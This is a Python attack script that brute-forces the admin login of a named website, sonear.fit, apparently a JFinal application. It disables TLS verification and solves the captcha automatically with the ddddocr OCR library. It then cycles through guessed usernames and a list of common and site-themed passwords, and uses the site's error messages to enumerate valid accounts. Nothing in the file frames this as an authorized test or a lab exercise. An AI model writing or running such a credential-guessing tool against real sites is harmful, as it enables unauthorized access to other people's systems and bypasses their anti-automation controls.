#!/usr/bin/env python3
"""sonear.fit JFinal后台爆破"""
import urllib.request, http.cookiejar, ssl, sys, time, re
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://sonear.fit"
ocr = ddddocr.DdddOcr(show_ad=False)

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]

def get_captcha():
    try:
        r = op.open(f"{B}/login/captcha", timeout=8)
        return r.read()
    except Exception:
        return None

def try_login(user, pw, max_attempts=12):
    for i in range(max_attempts):
        cap = get_captcha()
        if cap is None:
            time.sleep(1); continue
        try:
            code = ocr.classification(cap)
        except Exception:
            continue
        if len(code) < 4: continue
        data = f"username={user}&password={pw}&captchaInput={code}".encode()
        try:
            r = op.open(urllib.request.Request(f"{B}/login/doLogin?returnUrl=", data=data), timeout=8)
            body = r.read().decode("utf-8","ignore")
            # 判断: 验证码错误/密码错误/成功
            if "验证码" in body and ("错误" in body or "不正确" in body):
                continue
            if "密码" in body and ("错误" in body or "不正确" in body):
                return "PASSWORD_WRONG"
            if "成功" in body or "index" in body.lower() or len(body) > 1000:
                return f"POSSIBLE_SUCCESS: {body[:100]}"
            return f"UNKNOWN({len(body)}): {body[:80]}"
        except Exception as e:
            return f"ERR:{str(e)[:40]}"
        time.sleep(0.2)
    return "VERIFY_FAIL"

users = ["admin", "test", "admin888", "sonear", "root", "shuangchen"]
pwds = ["admin123", "123456", "admin888", "admin", "12345678", "a123456", "admin@123",
        "123123", "111111", "888888", "000000", "123456789", "abc123", "passw0rd",
        "Admin123", "Admin888", "sonear123", "shuangchen123", "test123", "test123456",
        "admin2024", "admin2025", "admin2026", "qwe123", "zxc123", "147258369",
        "5201314", "woaini", "123456a", "Aa123456", "shuangchen", "shuangchen888"]

found_user = None
for u in users:
    print(f"--- {u} ---", flush=True)
    for pw in pwds:
        r = try_login(u, pw)
        if r == "VERIFY_FAIL":
            print(f"  {u}/{pw}: 验证码识别失败(多次)", flush=True)
            break
        if r == "PASSWORD_WRONG":
            print(f"  !!! 用户存在: {u} (密码错误)", flush=True)
            found_user = u
            break
        if r != "VERIFY_FAIL" and "UNKNOWN" not in r and "ERR" not in r:
            print(f"  {u}/{pw}: {r}", flush=True)
            if "SUCCESS" in r:
                sys.exit(0)
        time.sleep(0.3)
    if found_user:
        # 用找到的用户继续爆破密码
        break
print("DONE")
